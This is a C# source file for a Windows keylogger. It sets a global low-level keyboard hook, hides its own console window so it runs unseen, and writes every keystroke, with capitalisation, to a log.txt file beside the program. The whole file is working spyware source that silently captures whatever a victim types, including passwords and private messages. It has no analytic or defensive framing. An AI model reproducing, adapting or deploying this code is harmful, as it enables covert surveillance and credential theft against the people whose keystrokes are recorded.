using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public class InterceptKeys
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static bool ShiftKey = false;
        private static bool Capital = false;
        private static Keys LastKey { get; set; }
        private static DateTime LastTypeTime { get; set; }

        public static void Init()
        {
            var handle = GetConsoleWindow();
            Capital = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;

            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);

        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                var vkCode = (Keys)Marshal.ReadInt32(lParam);
                var strCode = string.Empty;

                if (vkCode == Keys.Capital && wParam == (IntPtr)WM_KEYDOWN)
                {
                    Capital = !Capital;
                }

                if (vkCode == Keys.LShiftKey || vkCode == Keys.RShiftKey)
                {
                    if (wParam == (IntPtr)WM_KEYDOWN)
                    {
                        ShiftKey = true;
                    }

                    if (wParam == (IntPtr)WM_KEYUP)
                    {
                        ShiftKey = false;
                    }
                }

                strCode = vkCode.ToString();

                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    if (strCode.Length <= 1)
                    {
                        if ((ShiftKey && Capital) || (!ShiftKey && !Capital))
                        {
                            strCode = strCode.ToLower();
                        }
                        else if ((ShiftKey && !Capital) || (!ShiftKey && Capital))
                        {
                            strCode = strCode.ToUpper();
                        }
                    }

                    strCode = strCode.Length > 1 ? " [" + strCode + "] " : strCode;

                    Console.Write(strCode);

                    Write(strCode);

                    LastKey = vkCode;
                    LastTypeTime = DateTime.Now;
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static void Write(string strCode)
        {
            using (StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true))
            {
                if ((DateTime.Now - LastTypeTime).Seconds > 10)
                {
                    sw.Write(Environment.NewLine);
                }

                sw.Write(strCode);
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        const int SW_HIDE = 0;
    }
}
